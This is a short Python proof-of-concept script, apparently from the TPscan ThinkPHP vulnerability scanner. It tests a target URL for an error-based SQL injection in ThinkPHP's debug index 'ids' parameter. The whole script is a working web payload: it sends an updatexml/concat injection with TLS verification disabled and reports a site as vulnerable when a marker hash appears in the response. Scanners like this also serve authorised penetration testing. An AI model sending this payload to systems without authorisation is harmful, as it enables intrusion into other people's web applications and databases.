#!/usr/bin/env python
# coding=utf-8
import urllib
import requests
import urllib3

urllib3.disable_warnings()
from termcolor import colored


def thinkphp_debug_index_ids_sqli_verify(url):
    """thinkphp_debug_index_ids_sqli_verify"""
    pocdict = {
        "vulnname": "thinkphp_debug_index_ids_sqli",
        "isvul": False,
        "vulnurl": "",
        "payload": "",
        "proof": "",
        "response": "",
        "exception": "",
    }
    headers = {
        "User-Agent": "TPscan",
    }
    payload = 'index.php?ids[0,UpdAtexml(0,ConcAt(0xa,Md5(2333)),0)]=1'
    try:
        vurl = urllib.parse.urljoin(url, payload)
        req = requests.get(vurl, headers=headers, timeout=15, verify=False)
        if r"56540676a129760" in req.text:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = vurl
            pocdict['proof'] = '56540676a129760'
            pocdict['response'] = req.status_code
            print(colored("[+] 目标存在 thinkphp_debug_index_ids_sqli 漏洞\tpayload: ", "green"))
            print(colored(pocdict, 'green'))
        else:
            print(colored("\n[*] 目标不存在 thinkphp_debug_index_ids_sqli 漏洞", "red"))
    except:
        print(colored("\n[*] 目标不存在 thinkphp_debug_index_ids_sqli 漏洞", "red"))
        pass
